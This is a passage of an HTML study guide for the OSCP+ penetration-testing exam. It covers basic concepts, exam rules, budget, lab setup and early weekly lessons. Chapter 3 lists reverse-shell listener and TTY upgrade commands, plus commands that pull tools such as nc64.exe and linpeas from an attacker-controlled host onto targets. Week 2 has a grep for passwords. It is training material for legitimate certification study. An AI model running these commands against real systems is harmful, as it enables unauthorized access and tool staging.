+  <div class="term-window" aria-hidden="true"><div class="term-head"><span></span><span></span><span></span><em>root@kali: ~/oscp-vault</em></div><div class="term-body"><div><b>$</b> nmap -sV --top-ports 5 exam.oscp</div><div class="term-dim">70 points to pass &nbsp;·&nbsp; 24h exam &nbsp;·&nbsp; assumed-breach AD set</div><div><b>$</b> ./try-harder <span class="term-cursor"></span></div></div></div>
+</div>
+
+<div class="book-container">
+
+<div class="toc-section" id="toc">
+  <h2>Table of Contents</h2>
+  <div class="toc-grid">
+    <a class="toc-item" href="#ch0"><span class="toc-num">00</span><div><div class="toc-title">Chapter Zero: How Computers & Networks Actually Work</div><div class="toc-sub">First-principles primer for your brother before Week 1 begins</div></div></a>
+    <a class="toc-item" href="#ch1"><span class="toc-num">01</span><div><div class="toc-title">The 49-Week Master Plan & Standing Time-Box Rules</div><div class="toc-sub">Weekly rhythm, 3-hour rabbit-hole cap, and verified PEN-200 syllabus</div></div></a>
+    <a class="toc-item" href="#ch2"><span class="toc-num">02</span><div><div class="toc-title">The OSCP+ Exam Rules, Scoring & Budget</div><div class="toc-sub">Assumed-breach AD, banned tools (sqlmap/Nessus/AI), and staged budget</div></div></a>
+    <a class="toc-item" href="#ch3"><span class="toc-num">03</span><div><div class="toc-title">Lab Setup, Exact RAM Sizing & Core Mechanics</div><div class="toc-sub">GOAD-Mini/BadBlood vs GOAD-Light RAM math, TTY upgrade, File Transfers</div></div></a>
+    <a class="toc-item" href="#ch4"><span class="toc-num">04</span><div><div class="toc-title">Your Two Tracks: Developer vs. True Beginner</div><div class="toc-sub">How to pair-study across Weeks 1–12 without leaving your brother behind</div></div></a>
+    <a class="toc-item" href="#ch5"><span class="toc-num">05</span><div><div class="toc-title">Phase 0: Foundations (Weeks 1–12)</div><div class="toc-sub">Linux, TCP/IP, Windows/AD basics, Web, Scripting, and First Boxes</div></div></a>
+    <a class="toc-item" href="#ch6"><span class="toc-num">06</span><div><div class="toc-title">Phase 1A: Recon, Web & Manual SQLi (Weeks 13–19)</div><div class="toc-sub">Service enumeration, LFI/RFI, Uploads, Manual SQLi, and Passwords</div></div></a>
+    <a class="toc-item" href="#ch7"><span class="toc-num">07</span><div><div class="toc-title">Phase 1B: Linux & Windows Privilege Models (Weeks 20–23)</div><div class="toc-sub">SUID, Capabilities, Cron, Windows Tokens, Services, and Registry</div></div></a>
+    <a class="toc-item" href="#ch8"><span class="toc-num">08</span><div><div class="toc-title">Phase 1C: Pivoting, Metasploit & Active Directory (Weeks 24–35)</div><div class="toc-sub">Ligolo-ng, Kerberos, BloodHound, Lateral Movement, and $19 PG Practice Sprint</div></div></a>
+    <a class="toc-item" href="#ch9"><span class="toc-num">09</span><div><div class="toc-title">Week 36 Gate Mock & Phase 2 Paid Window (Weeks 36–49)</div><div class="toc-sub">24-Hour PG Practice Gate Mock, PEN-200 labs, LainKusanagi list, Mocks</div></div></a>
+    <a class="toc-item" href="#ch10"><span class="toc-num">10</span><div><div class="toc-title">Exam Day Playbook & Master Bibliography</div><div class="toc-sub">Flexible 24-hour protocol, proof rules, and verified resource links</div></div></a>
+  </div>
+</div>
+
+<!-- CHAPTER 0 -->
+<div class="chapter" id="ch0">
+  <div class="chapter-label">Chapter 00</div>
+  <h2>Chapter Zero: How Computers & Networks Actually Work</h2>
+  <p class="chapter-desc">Written specifically for your brother starting from zero IT background. Read and discuss these four mental models together before starting Week 1. Once you can picture how an operating system and network operate under the hood, every command in this book makes intuitive sense.</p>
+
+  <div class="theory-box">
+    <div class="theory-box-title">Mental Model 1: Hardware, The Kernel, and User Space</div>
+    <p>Think of a computer like a high-security bank. At the center is the <strong>Hardware</strong> (CPU, RAM, Hard Disk)—the physical vault. Surrounding the hardware is the <strong>Kernel</strong>—the bank manager who holds absolute control over the machine. Surrounding the Kernel is <strong>User Space</strong>—the public lobby where normal programs (like a web browser or a web server) run.</p>
+    <p>Every program runs under a specific <strong>User Account</strong>. Normal accounts (like <code>www-data</code> on Linux or <code>iis apppool\defaultapppool</code> on Windows) are severely restricted by the Kernel so they cannot read sensitive files or change system settings. At the top sits the superuser account—called <strong><code>root</code></strong> (User ID 0) on Linux, and <strong><code>NT AUTHORITY\SYSTEM</code></strong> on Windows.</p>
+    <p><strong>What is Privilege Escalation?</strong> When you first gain access to a target server through a vulnerable website, your terminal session inherits the low permissions of that website's user account (worth 10 points on the exam). Privilege Escalation (worth the second 10 points) is the process of auditing the computer to find a misconfigured script, scheduled task, or system service that runs with superuser authority, allowing you to step up from a low-privilege account to `root` or `SYSTEM`.</p>
+  </div>
+
+  <div class="theory-box">
+    <div class="theory-box-title">Mental Model 2: IP Addresses, Ports, and Network Services</div>
+    <p>Every computer on a network has an <strong>IP Address</strong> (like <code>192.168.45.120</code>), which acts like the street address of an apartment building. Inside that computer are <strong>65,535 numbered Ports</strong> (numbered `1` to `65535`), which act like individual apartment doors.</p>
+    <p>An open port means a <strong>Service (or Daemon)</strong>—a background program—is sitting behind that door waiting to talk to other computers over the network:
+    <br>• <strong>Port 22 (SSH):</strong> Remote encrypted command-line login for Linux (and sometimes Windows).
+    <br>• <strong>Port 80 (HTTP) & Port 443 (HTTPS):</strong> Web servers (Apache, Nginx, Microsoft IIS) serving websites and APIs.
+    <br>• <strong>Port 139 & Port 445 (SMB):</strong> Windows File and Printer Sharing.
+    <br>• <strong>Port 3389 (RDP) & Port 5985 (WinRM):</strong> Windows Remote Desktop (graphical) and Windows Remote Management (command line).</p>
+    <p>When we run a port scanner like <strong>Nmap</strong>, we are simply knocking on all 65,535 doors to discover which services are listening and what software versions they are running.</p>
+  </div>
+
+  <div class="theory-box">
+    <div class="theory-box-title">Mental Model 3: What Is a "Shell" (Bind vs. Reverse)?</div>
+    <p>A <strong>Shell</strong> (such as `bash` on Linux, or `cmd.exe` and `powershell.exe` on Windows) is simply a text interpreter: you type a command, the OS runs it, and it prints the text output back to you.</p>
+    <p>When you assess a remote server and discover a vulnerability that allows command execution, you need a way to interact with that server's shell over the network:
+    <br>• <strong>Bind Shell:</strong> You tell the target server to open a new listening port, and your Kali machine connects <em>inward</em> to it. (Often blocked by incoming firewalls).
+    <br>• <strong>Reverse Shell:</strong> You open a listening port on your Kali machine (`rlwrap nc -lvnp 443`), and you instruct the target server to connect <em>outward</em> back to your Kali IP. Because firewalls usually allow outbound traffic on common ports like 80 or 443, reverse shells are standard practice.</p>
+  </div>
+
+  <div class="theory-box">
+    <div class="theory-box-title">Mental Model 4: What Is Active Directory (AD)?</div>
+    <p>In a home setup, each computer keeps its own local list of usernames and passwords. In a company with 500 computers, managing accounts locally on each machine would be impossible. Instead, companies use Microsoft <strong>Active Directory (AD)</strong>.</p>
+    <p>In an AD network (called a <strong>Domain</strong>), a central server called the <strong>Domain Controller (DC)</strong> holds the master database (`NTDS.dit`) of every employee's username, password hash, and permissions. When an employee sits down at Workstation #1 or Server #2 and logs in, that machine asks the Domain Controller: <em>"Is this user who they say they are, and are they allowed to access this computer?"</em> Compromising the Domain Controller gives an auditor administrative authority over every computer joined to that domain.</p>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 1 -->
+<div class="chapter" id="ch1">
+  <div class="chapter-label">Chapter 01</div>
+  <h2>The 49-Week Master Plan & Standing Time-Box Rules</h2>
+  <p class="chapter-desc">Designed for two learners studying 10–14 hours per week. Learn for $0 across Weeks 1–31, invest $19 in Proving Grounds Practice during Weeks 32–36 to test yourself on real OffSec-built Windows/Linux/AD machines and pass a full 24-hour Gate Mock Exam, and only then commit $1,749 to the 13-week PEN-200 window.</p>
+
+  <h3>1.1 Weekly Rhythm (12 Hours/Week) & Standing Anti-Rabbit-Hole Rule</h3>
+  <ul>
+    <li><strong>Three 2-Hour Weekday Sessions (6 hrs):</strong> Structured reading, textbook theory, and building/auditing flaws in your local home VMs.</li>
+    <li><strong>One 4–6 Hour Weekend Session (5.5 hrs):</strong> Hands-on practice boxes and AD lab chains.</li>
+    <li><strong>Sunday Debrief (30 mins):</strong> Clean your Obsidian notes, log any missed enumeration steps in your Failure Log, and write one clean mini-report.</li>
+  </ul>
+
+  <div class="callout danger">
+    <div class="callout-title">Standing Rule Across All Weeks (Weeks 11–48): The 2-Hour / 3-Hour Rabbit-Hole Cap</div>
+    The #1 cause of schedule collapse at 12 hours/week is letting a single practice box consume an entire 8-hour weekend. From Week 11 through the end of the course, enforce this hard timer on every standalone machine and lab exercise:
+    <br>• <strong>0:00 to 2:00 (Pure Independent Effort):</strong> Zero hints, zero walkthroughs. Follow your Obsidian enumeration checklist methodically.
+    <br>• <strong>At the 2:00 Mark (Single Targeted Nudge):</strong> If you have made zero forward progress for 2 hours, check <strong>one single hint</strong> (or ask your brother for a one-sentence nudge on which service/parameter to inspect) and work for up to 1 more hour.
+    <br>• <strong>At the 3:00 Hard Stop (Read, Replicate, Log & Move On):</strong> Never spend more than 3 hours stuck on a single practice box. At 3 hours, read the write-up up to the step you missed, execute the technique yourself, write a 2-sentence entry in <code>03_Failure_And_Lesson_Log.md</code> explaining what to add to your checklist so it never beats you again, and move on.
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Phase</th><th>Weeks</th><th>Cost</th><th>Operational Goal</th></tr></thead>
+      <tbody>
+        <tr><td><strong>0. Foundations</strong></td><td>Weeks 1–12</td><td>$0 (Free)</td><td>Linux CLI, TCP/IP networking, Windows & AD basics, Web basics, Scripting, and your first guided/unguided boxes.</td></tr>
+        <tr><td><strong>1A–1C. PEN-200 Topic Mastery</strong></td><td>Weeks 13–31</td><td>$0 (Free)</td><td>Master every tested PEN-200 syllabus module using free platforms (PortSwigger, THM free, PG Play) and local VMs.</td></tr>
+        <tr><td><strong>1D. OffSec Sprint & Gate Mock</strong></td><td>Weeks 32–36</td><td><strong>$19</strong> (1 Mo PG Practice)</td><td>4-week sprint on real OffSec Windows/Linux/AD boxes in PG Practice, culminating in a <strong>24-Hour Blind Mock Exam in Week 36</strong> before buying PEN-200.</td></tr>
+        <tr><td><strong>2. The Paid PEN-200 Window</strong></td><td>Weeks 37–49 (13 Wks)</td><td>PEN-200 + PG Practice</td><td>Official PEN-200 exercises, LainKusanagi PG Practice list, Medtech/Relia/Skylark challenge labs, and OSCP A/B/C mocks.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>1.2 Verified Official PEN-200 Learning Plan Alignment</h3>
+  <p>Cross-referenced directly against OffSec's official <strong>24-Week Learning Plan (`help.offsec.com/hc/en-us/articles/15545672357780`)</strong> and the official <strong>OSCP+ Body of Knowledge (`articles/38543335188756`)</strong>:</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Official PEN-200 Module (24-Week Plan Order)</th><th>Where Covered in Our Book</th></tr></thead>
+      <tbody>
+        <tr><td>1. General Course Info, Intro to Cybersecurity & Report Writing</td><td>Chapter 1, Chapter 3 & Weekly Sunday Reports</td></tr>
+        <tr><td>2. Information Gathering & Vulnerability Scanning</td><td>Phase 1 — Weeks 13–14</td></tr>
+        <tr><td>3. Introduction to Web Application Attacks</td><td>Phase 0 (Week 6) & Phase 1 (Week 15)</td></tr>
+        <tr><td>4. Common Web Application Attacks (Parts 1 & 2)</td><td>Phase 1 — Weeks 16–17</td></tr>
+        <tr><td>5. SQL Injection Attacks</td><td>Phase 1 — Week 18</td></tr>
+        <tr><td>6. Locating Public Exploits & Fixing Exploits</td><td>Phase 1 — Week 19</td></tr>
+        <tr><td>7. Password Attacks</td><td>Phase 1 — Week 19</td></tr>
+        <tr><td>8. Linux Privilege Escalation</td><td>Phase 1 — Weeks 20–21</td></tr>
+        <tr><td>9. Windows Privilege Escalation</td><td>Phase 1 — Weeks 22–23</td></tr>
+        <tr><td>10. Client-Side Attacks & Antivirus Evasion</td><td>Phase 1 — Week 24</td></tr>
+        <tr><td>11. Port Redirection & SSH Tunneling</td><td>Phase 1 — Week 25</td></tr>
+        <tr><td>12. Tunneling Through Deep Packet Inspection & The Metasploit Framework</td><td>Phase 1 — Week 26</td></tr>
+        <tr><td>13. Active Directory Introduction & Enumeration</td><td>Phase 1 — Week 27</td></tr>
+        <tr><td>14. Attacking Active Directory Authentication</td><td>Phase 1 — Weeks 28–29</td></tr>
+        <tr><td>15. Lateral Movement in Active Directory</td><td>Phase 1 — Week 30</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-title">Official Syllabus Note: What About AWS Cloud, Nessus, and sqlmap?</div>
+    OffSec's marketing page (`offsec.com/courses/pen-200/`) mentions an added bonus module on *"Enumerating and attacking AWS cloud infrastructure"* as well as tools like `Nessus` and `sqlmap`. However, per OffSec's official **OSCP+ Body of Knowledge** and **Exam Guide**:
+    <br>1. **AWS Cloud is NOT tested on the OSCP+ exam** and is omitted from OffSec's official 12-week and 24-week exam prep schedules. Do not waste prep weeks studying AWS before your exam; you can read the bonus module inside the portal after passing.
+    <br>2. **`sqlmap` and `Nessus` are strictly banned on the OSCP+ exam.** Even though PEN-200 teaches them conceptually for real-world consulting, you must perform all SQL injection and vulnerability verification manually on exam day.
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 2 -->
+<div class="chapter" id="ch2">
+  <div class="chapter-label">Chapter 02</div>
+  <h2>The OSCP+ Exam Rules, Scoring & Staged Budget</h2>
+
+  <h3>2.1 Scoring Breakdown (70 Points to Pass)</h3>
+  <ul class="checklist">
+    <li><strong>1 Active Directory Set (40 Points Total — Assumed Breach):</strong> Consists of 2 domain clients/servers and 1 Domain Controller. You are given a valid standard domain user's username and password at the start of the exam. Partial points are awarded: <strong>10 points</strong> for Machine 1, <strong>10 points</strong> for Machine 2, and <strong>20 points</strong> for the Domain Controller.</li>
+    <li><strong>3 Standalone Machines (60 Points Total — 20 Points Each):</strong> Each machine awards <strong>10 points</strong> for initial low-privilege access (`local.txt`) and <strong>10 points</strong> for privilege escalation to `root` or `SYSTEM` (`proof.txt`).</li>
+    <li><strong>Zero Bonus Points:</strong> Lab exercises no longer grant bonus points. To reach 70 points, your highest-probability path is: <strong>Full AD Set (40 pts) + 1 Full Standalone (20 pts) + 1 Standalone Initial Access (10 pts) = 70 pts</strong>.</li>
+    <li><strong>Time Allocation:</strong> 23 hours and 45 minutes of VPN exam access, followed by 24 hours to submit your professional PDF report.</li>
+  </ul>
+
+  <div class="callout danger">
+    <div class="callout-title">Strict Exam Prohibitions (Verify on help.offsec.com Before Booking)</div>
+    <ul>
+      <li><strong>Zero AI Usage:</strong> Any use of AI chatbots, LLMs (ChatGPT, Claude, Gemini, Copilot, local Ollama models), or browser AI extensions during the exam is strictly prohibited and results in immediate revocation.</li>
+      <li><strong>Banned Scanners & Exploit Tools:</strong> Automated exploitation tools (`sqlmap`), mass commercial/automated vulnerability scanners (`Nessus`, `OpenVAS`, `Acunetix`), and `Burp Suite Pro` Active Scanner are forbidden.</li>
+      <li><strong>Single-Target Metasploit Limit:</strong> You may use Metasploit exploit/post modules and the `Meterpreter` payload against **only one (1) single target machine** during the entire exam. Using `msfvenom` to generate standard non-Meterpreter shells or using `multi/handler` to catch standard reverse shells is permitted on all machines.</li>
+      <li><strong>No Spoofing/Poisoning:</strong> LLMNR/NBT-NS poisoning (`Responder`) and ARP spoofing are prohibited.</li>
+    </ul>
+  </div>
+
+  <h3>2.2 Staged Budget Plan: Never Risk $1,749 Blindly</h3>
+  <p>Instead of going from $0 directly to a $1,749 purchase, this plan uses a **$19 intermediate verification stage** at Week 32 so you can prove you can beat official OffSec Windows and AD machines under a 24-hour timer before buying PEN-200:</p>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Stage</th><th>Weeks</th><th>Cost Per Person</th><th>What You Buy & Why</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Stage 1: Free Mastery</strong></td><td>Weeks 1–31</td><td><strong>$0</strong></td><td>Linux Journey, Bandit, PortSwigger Academy, THM free rooms, PG Play (free Linux), and local Windows/AD VMs.</td></tr>
+        <tr><td><strong>Stage 2: Pre-Gate OffSec Sprint & 24h Gate Mock</strong></td><td>Weeks 32–36</td><td><strong>$19</strong> (1 Month PG Practice)</td><td>Unlocks OffSec-authored Windows, AD, and retired OSCP exam machines so you can run a real 24-hour mock exam in Week 36 before spending $1,749.</td></tr>
+        <tr><td><strong>Stage 3A: Lean Paid Window</strong></td><td>Weeks 37–49</td><td><strong>~$1,768</strong> ($1,749 PEN-200 + 1 more mo PG Practice)</td><td>90-day PEN-200 course + Challenge Labs + OSCP A/B/C + 1 exam attempt.</td></tr>
+        <tr><td><strong>Stage 3B: High-Slack Window</strong></td><td>Weeks 37–49+</td><td><strong>~$2,768</strong> ($2,749 Learn One + 1 more mo PG Practice)</td><td>365-day PEN-200 lab access + 2 exam attempts (safer if work/life interrupts your 90-day sprint).</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 3 -->
+<div class="chapter" id="ch3">
+  <div class="chapter-label">Chapter 03</div>
+  <h2>Lab Setup, Exact RAM Sizing & Core Mechanics</h2>
+
+  <h3>3.1 Hardware & Exact Active Directory Lab RAM Math</h3>
+  <p>Running out of RAM mid-session freezes your hypervisor and ruins study nights. When calculating RAM for local VMs, you must account for **Host OS (~4 GB) + Kali Linux VM (4 GB) + Target VMs**. Choose your local Active Directory architecture based on your computer's physical RAM:</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Your Host PC RAM</th><th>Recommended Local AD Lab Setup</th><th>Total RAM Usage Breakdown</th></tr></thead>
+      <tbody>
+        <tr><td><strong>8 GB RAM</strong> (Minimum)</td><td><strong>Single DC (2 GB) + Win10 Client (2 GB) + BadBlood</strong> (Run Kali with lightweight XFCE at 2 GB)</td><td>Host (2 GB) + Kali (2 GB) + DC (2 GB) + Client (2 GB) = <strong>8 GB</strong></td></tr>
+        <tr><td><strong>16 GB RAM</strong> (Standard)</td><td><strong>2-VM Custom Domain + BadBlood</strong> (Windows Server 2022 DC + Windows 10/11 Client) <em>OR</em> <strong>GOAD-Mini</strong> (1 DC VM + 1 added workstation)</td><td>Host (4 GB) + Kali (4 GB) + DC (4 GB) + Client (3–4 GB) = <strong>15–16 GB</strong> (Safe & smooth!)</td></tr>
+        <tr><td><strong>24 GB – 32 GB+ RAM</strong></td><td><strong>GOAD-Light</strong> (3 VMs: 2 DCs + 1 Server, requires ~10–12 GB for target VMs alone) <em>OR</em> <strong>Full GOAD</strong> (5 VMs, requires 20–24 GB for target VMs)</td><td>Host (4 GB) + Kali (4 GB) + GOAD-Light (12 GB) = <strong>20 GB total</strong> (Do NOT run GOAD-Light on a 16 GB machine!)</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout success">
+    <div class="callout-title">Why BadBlood + 2 Evaluation VMs Is the Best 16 GB Solution</div>
+    A freshly installed Windows Server Domain Controller is empty and unrealistic. Running the free <strong>BadBlood</strong> PowerShell script (<code>github.com/davidprowe/BadBlood</code>) on your 4 GB Windows Server Evaluation DC automatically generates 2,500+ realistic users, 500+ groups, nested Organizational Units, Service Principal Names (SPNs for Kerberoasting), AS-REP roastable accounts, and randomized ACL misconfigurations (<code>GenericAll</code>, <code>ForceChangePassword</code>, <code>WriteDacl</code>) in 3 minutes—giving you a realistic BloodHound attack graph inside 16 GB of total system RAM.
+  </div>
+
+  <h3>3.2 Core Mechanics Reference: TTY Shell Upgrade & File Transfers</h3>
+  <p>Bookmark this section and start drilling these exact commands in Week 9. Every single box you audit will require upgrading a fragile network shell and moving enumeration tools across the network.</p>
+
+  <h4>1. Upgrading a Raw Linux Shell to a Full Interactive TTY</h4>
+  <div class="cmd-block"><span class="comment"># On Kali: Always wrap your netcat listener in rlwrap for arrow-key history</span>
+rlwrap nc -lvnp 443
+
+<span class="comment"># Inside the Linux target shell: Spawn a full bash pseudo-terminal</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="comment"># Fallback if python3 is not installed:</span>
+script -qc /bin/bash /dev/null
+
+<span class="comment"># Press Ctrl+Z to background the shell, then run on your Kali terminal:</span>
+stty raw -echo; fg
+
+<span class="comment"># Inside the restored target shell, configure terminal emulation & size:</span>
+reset xterm
+export TERM=xterm-256color
+export SHELL=/bin/bash
+stty rows 40 columns 150</div>
+
+  <h4>2. Moving Files To and From a Linux Target</h4>
+  <div class="cmd-block"><span class="comment"># On Kali: Start a temporary HTTP server in the folder containing your tools</span>
+python3 -m http.server 80
+
+<span class="comment"># On Linux Target: Download into /tmp or /dev/shm (world-writable folders)</span>
+wget http://&lt;KALI_IP&gt;/linpeas.sh -O /dev/shm/linpeas.sh
+curl http://&lt;KALI_IP&gt;/linpeas.sh -o /dev/shm/linpeas.sh
+
+<span class="comment"># Base64 Copy-Paste Fallback (When firewall blocks all outbound connections)</span>
+<span class="comment"># On Kali:</span> base64 -w 0 binary_file
+<span class="comment"># On Target:</span> echo "&lt;BASE64_STRING&gt;" | base64 -d &gt; /tmp/binary_file && chmod +x /tmp/binary_file</div>
+
+  <h4>3. Moving Files To and From a Windows Target</h4>
+  <div class="cmd-block"><span class="comment"># Method A: PowerShell Invoke-WebRequest (iwr)</span>
+iwr -uri http://&lt;KALI_IP&gt;/winPEASx64.exe -Outfile C:\Windows\Tasks\winpeas.exe
+
+<span class="comment"># Method B: Certutil native Windows binary</span>
+certutil.exe -urlcache -split -f http://&lt;KALI_IP&gt;/nc64.exe C:\Windows\Tasks\nc64.exe
+
+<span class="comment"># Method C: Authenticated SMB Server (Most reliable on modern Windows 10/11/Server 2022)</span>
+<span class="comment"># On Kali:</span>
+impacket-smbserver share $(pwd) -smb2support -username user -password pass
+<span class="comment"># On Windows Target:</span>
+net use Z: \\&lt;KALI_IP&gt;\share /user:user pass
+copy Z:\winPEASx64.exe C:\Windows\Tasks\winpeas.exe</div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 4 -->
+<div class="chapter" id="ch4">
+  <div class="chapter-label">Chapter 04</div>
+  <h2>Your Two Tracks: Developer vs. True Beginner</h2>
+  <p class="chapter-desc">Both brothers follow the same 49-week calendar so you can test each other every Sunday. The adjustments below apply to Phase 0 (Weeks 1–12) so your brother builds rock-solid fundamentals while you use your existing coding experience to prepare lab tooling.</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>Weeks & Topic</th><th>You (Flutter Developer)</th><th>Your Brother (True Beginner)</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Weeks 1–2: Linux CLI</strong></td><td>Finish OverTheWire Bandit 0–20 in Week 1; spend Week 2 studying systemd services, cron internals, and bash piping.</td><td>Full 2 weeks on Linux Journey + Bandit 0–20. Type every command manually and read `man` pages.</td></tr>
+        <tr><td><strong>Weeks 3–4: Networking</strong></td><td>Full study of TCP/IP, DNS, SMB, SNMP, and Wireshark packet captures.</td><td>Full 2 weeks plus extra weekend subnetting drills and tracing TCP handshakes in Wireshark.</td></tr>
+        <tr><td><strong>Weeks 7–8: Scripting</strong></td><td>Finish the Python/Bash tools in Week 7; spend Week 8 configuring BadBlood on the Windows AD lab (or GOAD-Light if 24GB+ RAM).</td><td>Full 2 weeks: Bash loops and piping in Week 7, Python `requests` and `socket` scripts in Week 8.</td></tr>
+        <tr><td><strong>Pair Responsibility</strong></td><td>Lead code review when adapting broken public Python/C exploits.</td><td>Lead the shared Enumeration Checklist and verify that every Sunday report is clear enough to replicate from scratch.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <a href="#toc" class="back-top">↑ Back to Contents</a>
+</div>
+
+<!-- CHAPTER 5 -->
+<div class="chapter" id="ch5">
+  <div class="phase-banner">
+    <div class="phase-num">Phase 0</div>
+    <h2>Foundations: From Zero to First Root (Weeks 1–12)</h2>
+    <p>Build complete fluency in Linux, networking, Windows/AD administration, web requests, and scripting before touching PEN-200 topics.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge">Week 1</span><h4>Linux Fundamentals I: Filesystem, Users & Permissions</h4></div>
+    <div class="week-goal">Navigate any Linux server blind via terminal, read/edit files, and decode rwx permission bits.</div>
+    <div class="theory-box">
+      <div class="theory-box-title">First Principles: The Linux Directory Tree & Permissions</div>
+      <p>Unlike Windows (`C:\`), Linux starts at the root slash (`/`). Key folders you will inspect on every target:
+      <br>• <code>/etc</code>: System configuration files (`passwd` lists users, `shadow` holds password hashes, `crontab` lists scheduled tasks, `sudoers` defines admin rights).
+      <br>• <code>/var/www</code>: Default location for web server files and database configuration scripts.
+      <br>• <code>/tmp</code> and <code>/dev/shm</code>: World-writable folders where any low-privilege user can download and execute diagnostic scripts.
+      <br>When you run <code>ls -la</code>, you see strings like <code>-rwxr-xr-- 1 root www-data</code>. The first character (`-` for file, `d` for directory) is followed by three sets of <strong>Read (r=4)</strong>, <strong>Write (w=2)</strong>, and <strong>Execute (x=1)</strong> permissions for the <strong>User owner</strong> (`rwx` = 7), the <strong>Group owner</strong> (`r-x` = 5), and <strong>Others</strong> (`r--` = 4).</p>
+    </div>
+    <p><strong>Mon/Wed/Fri (2h each):</strong> Complete the <em>Grasshopper</em> track and start <em>Novice</em> on <strong>Linux Journey</strong>.</p>
+    <p><strong>Weekend (4–6h):</strong> Complete <strong>OverTheWire Bandit Levels 0–10</strong> via SSH (`ssh bandit0@bandit.labs.overthewire.org -p 2220`). Never search for solutions—use the command manual pages (`man find`, `man file`).</p>
+    <div class="cmd-block">ls -la, cd, pwd, cat, less, head, tail, file, find, locate, chmod, chown, id, whoami, man, which</div>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://linuxjourney.com/" target="_blank">Linux Journey</a> · <a href="https://overthewire.org/wargames/bandit/" target="_blank">OverTheWire Bandit</a>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge">Week 2</span><h4>Linux Fundamentals II: Processes, Cron, Pipes & Redirection</h4></div>
+    <div class="week-goal">Chain commands with pipes, suppress errors, inspect running processes, and understand scheduled tasks.</div>
+    <div class="theory-box">
+      <div class="theory-box-title">First Principles: Standard Streams (STDIN, STDOUT, STDERR)</div>
+      <p>Every Linux command has three data streams: <strong>0 (Standard Input)</strong>, <strong>1 (Standard Output)</strong>, and <strong>2 (Standard Error)</strong>.
+      <br>• The pipe symbol (<code>|</code>) sends the output of Command A directly into the input of Command B (e.g., <code>ps aux | grep root</code>).
+      <br>• Appending <code>2&gt;/dev/null</code> redirects all "Permission denied" error messages (Stream 2) into the virtual trash bin (`/dev/null`) so you only see clean results when searching the entire hard drive.</p>
+    </div>
+    <p><strong>Mon/Wed/Fri:</strong> Finish <em>Novice</em> and complete the <em>Journeyman</em> track on Linux Journey (processes, packages, network files, cron).</p>
+    <p><strong>Weekend:</strong> Complete <strong>Bandit Levels 10–20</strong> (base64, hex, compression, SSH private keys, and `nc` connections).</p>
+    <div class="cmd-block"><span class="comment"># Checkpoint Command to Master & Explain:</span>
+find / -writable -type f -not -path "/proc/*" 2>/dev/null
+grep -rnw '/var/www/' -e 'password' 2>/dev/null
+ps aux && ss -tulpn && crontab -l</div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge green">Week 3</span><h4>Networking I: OSI/TCP Models, IP Addressing & Subnetting</h4></div>
+    <div class="week-goal">Trace how packets move across networks and calculate CIDR subnets (/24, /16, /26) by hand.</div>
+    <div class="theory-box">
+      <div class="theory-box-title">First Principles: TCP Handshakes & Subnet Masks</div>
+      <p>Before two computers exchange data over <strong>TCP</strong>, they complete a three-step handshake: the client sends a <strong>SYN</strong> packet, the server replies with <strong>SYN-ACK</strong> if the port is open (or <strong>RST</strong> if closed), and the client replies with <strong>ACK</strong>.
+      <br>A <strong>Subnet Mask</strong> (like `/24` or `255.255.255.0`) defines how many IP addresses live inside a local neighborhood. A `/24` network has $2^{32-24} = 256$ total addresses (`254` usable hosts from `.1` to `.254`). On the OSCP exam, when you compromise a dual-homed server and see an interface with `172.16.50.10/24`, you immediately know there are up to 253 other potential hosts (`172.16.50.1` to `.254`) hiding on that internal network.</p>
+    </div>
+    <p><strong>Mon/Wed/Fri:</strong> TryHackMe free networking rooms (<em>What is Networking</em>, <em>Intro to LAN</em>) and Professor Messer's <strong>Network+ N10-009</strong> OSI, TCP/IP, and Subnetting videos.</p>
+    <p><strong>Weekend:</strong> Drill subnetting on `subnetting.net` or `subnetting-questions.com` until both brothers can split a `/24` into 4 equal `/26` subnets on paper in under 2 minutes.</p>
+    <div class="ref-box">
+      <strong>References:</strong> <a href="https://www.professormesser.com/network-plus/n10-009/n10-009-video/n10-009-training-course/" target="_blank">Professor Messer Network+</a> · <a href="https://www.subnetting.net/" target="_blank">Subnetting.net</a>
+    </div>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge green">Week 4</span><h4>Networking II: Wireshark, DNS, SMB, SMTP & SNMP</h4></div>
+    <div class="week-goal">Inspect raw network packets in Wireshark and understand the core enterprise protocols you will enumerate on every box.</div>
+    <p><strong>Mon/Wed:</strong> Install Wireshark, capture traffic while pinging and browsing a local VM, and filter by `dns`, `arp`, `tcp`, and `http`. Complete TryHackMe's free <em>DNS in Detail</em> room.</p>
+    <p><strong>Fri/Weekend:</strong> Study how <strong>SMB (Ports 139/445)</strong> shares files and leaks Windows domain names, how <strong>SMTP (Port 25)</strong> verifies valid mail users (`VRFY`/`EXPN`), and how <strong>SNMP (UDP Port 161)</strong> exposes system management trees (MIBs) when left with the default `public` community string.</p>
+  </div>
+
+  <div class="week-card">
+    <div class="week-card-header"><span class="week-badge cyan">Week 5</span><h4>Windows Internals & Active Directory Lab Construction</h4></div>
